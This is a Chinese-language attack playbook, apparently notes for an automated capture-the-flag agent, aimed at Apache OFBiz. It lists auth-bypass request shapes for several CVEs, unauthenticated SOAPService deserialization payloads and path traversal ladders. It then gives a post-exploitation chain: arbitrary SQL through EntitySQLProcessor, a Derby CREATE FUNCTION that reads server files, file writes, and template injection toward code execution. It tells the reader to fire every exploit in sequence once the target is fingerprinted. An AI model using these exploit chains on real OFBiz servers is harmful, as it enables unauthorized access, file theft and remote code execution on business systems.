# [REFERENCE] Apache OFBiz 攻击面电池

适用指纹:8443 端口(默认)、登录页/错误页带 `Powered by Apache OFBiz`、
`/webtools/control/main`、Release 18.12.x。指纹一确认,本电池按序整发跑——
OFBiz 的 CVE 家族是连环的:每一代 auth bypass 修不完全,下一代绕过修复本身。
公开谱系:Apache OFBiz 官方 advisories(2020-2024)、GitHub PoC 家族
(ofbiz-cgi/CVE-2023-51467 POC 仓库)、Sonicwall/rapid7 分析文。

## 0. 慢启动铁律(先于一切攻击)

OFBiz(大 JVM)冷启动到首个 HTTP 响应要 2-4 分钟,TCP 早开、HTTP 沉默是常态。
就绪循环放宽到 5 分钟(10s 一探)再谈其他,严禁 90 秒判死重启——重启清零
开机时钟,只会再哑一轮。多 pass 重进时旧容器若还活着优先复用。

## 1. 认证绕过家族(按 CVE 序全打,一个都不是单发)

绕过的共同机理:授权检查依赖 redirect 参数/视图授权映射,可被注入覆盖。

- **CVE-2023-46550**:`GET /webtools/control/forgotPassword?externalLoginKey=..`
  家族——把未授权端点与授权检查混淆。载体:`forgotPassword`、`checkLogin` 带
  `POST_AUTH=...`/redirect 参数变体。
- **CVE-2023-51467**(46550 的不完全修复):同端点家族,载荷形状
  `?PAYMENT=/webtools/control/ProgramExport`(参数名可换——**参数注入是这一族
  的核心:任何接受视图名/URI 的参数都是载体**),使授权检查重定向到受保护视图
  而不触发登录。验证:绕过成功后 `/webtools/control/main` 不再 302 到 login。
- **CVE-2024-45195**:`GET /webtools/control/Various?previewProductStoreId=...`
  未授权视图访问(视图授权映射缺陷),同族还有 `ProgramExport`、`ViewBuilder`
  等视图名枚举——把 webtools 视图列表当目录爆破打。
- 通用变体轨道:参数名注入(`;`/`/` 分隔的 URI 参数污染)、`authorizeView`
  覆写、`USERNAME` 参数注入到 login-token 流。

## 2. RCE 家族(bypass 之后的第一跳)

- **CVE-2023-51467 RCE 尾巴**(bypass + `/webtools/control/forgotPassword/`
  或 SOAPService 的反序列化):java 序列化 body(TemplateImpl gadget),
  载体端点 `/webtools/control/SOAPService`(xmlrpc 包裹,`<pref:`serialization
  元素带 base64 序列化流)。
- **CVE-2021-26295**:`POST /webtools/control/SOAPService` 未授权
  `commons-beanutils` 反序列化(gadget 链 CB1 + TemplateImpl 定义执行),
  老版本直接命中。
- **CVE-2024-45500/45501/45502**:`/webtools/control/forgotPassword/` 与
  `viewperms`/`WebServiceInterface` 的 path traversal + Groovy 表达式/
  ClassLoader 注入族,视图路径 `../` 深度梯 1..12 一次跑全。
- 全部载体打完才谈手工测绘(半记忆拼 PoC 是头号时间坑:逐字复现公开 PoC,
  失败才改编)。

## 3. 后渗透速查(bypass 成功、RCE 未竟时的未授权原语链)

拿到 webtools 会话后,`EntitySQLProcessor`(webtools 的 SQL 执行器)是
半授权 RCE 的入口——Derby 数据库原语可以一路走到文件读写:

1. **SQL 面**:`POST /webtools/control/EntitySQLProcessor`(需绕过后的会话),
   SELECT 直接回显结果行。
2. **Derby CREATE FUNCTION → Java 静态方法**(读文件):
   `CREATE FUNCTION READF(P VARCHAR(32000)) RETURNS VARCHAR(32000) PARAMETER
   STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME
   'org.apache.ofbiz.base.util.UtilIO.readString(java.lang.String)'` ——
   UtilIO.readString(单参重载)读 UTF-8 文件;之后 `SELECT READF('/flag.txt')`。
3. **写文件**:`UtilIO.writeStringFromString(path, content)` 双参 EXTERNAL
   NAME(注意 Derby 方法签名解析:参数个数与重载必须精确对应,签名不匹配报
   方法不存在——先打只有唯一重载的形状)。
4. **INSERT vs UPDATE**:OFBiz 的 EntitySQLProcessor 对 INSERT 常 500
   (走 executeQuery 路径炸),UPDATE 正常回 Affected rows——写不进就 UPDATE
   已有行,别在 INSERT 变体上磨。
5. **FTL 渲染链(模板注入 → 代码执行)**:污染 DATA_RESOURCE /
   ELECTRONIC_TEXT 行(UPDATE DATA_RESOURCE SET OBJECT_INFO='<ftl-payload>'
   或更新 ElectronicText),再经 `/cmssite/cms/<CMSID>` 触发渲染:
   `${1+1}` 探针先行,命中后 `?excel=` 或 Groovy/execute 形状。注意**缓存
   陷阱**:ELECTRONIC_TEXT 更新成功(Affected 1)但页面仍渲染旧文,先
   `/webtools/control/FindUtilCacheClearAll` 再看;清了还不生效=文本在磁盘
   decorator 不在 DB,换 DATA_RESOURCE/OBJECT_INFO 载体,别在缓存假设上磨。
6. **文件读直接收旗**:任何 readString 原语到手,第一发读约定旗位
   `/challenge/flag.txt`、`/flag.txt`、`/root/flag*`,再谈应用文件。

## 4. 纪律

- 逐字复现优先:命中指纹后 1-2 节按序整发跑(脚本电池一轮 ≈ 10 分钟),
  全败才进第 3 节手工链。
- 第 3 节每一步都是一发 HTTP/SQL 的事:Derby 函数签名/缓存陷阱的每一条
  试错都要记台账,下一 pass 直接从结论续。
- OFBiz 是「easy 档也可能长这样」的组件:深链(第 3 节)累计 20 分钟零旗
  =回第 1/2 节把 PoC 家族变体打全,再谈测绘(此组件的历史 CVE 全是家庭作坊
  式连环洞,公开 PoC 命中率远高于手工链)。
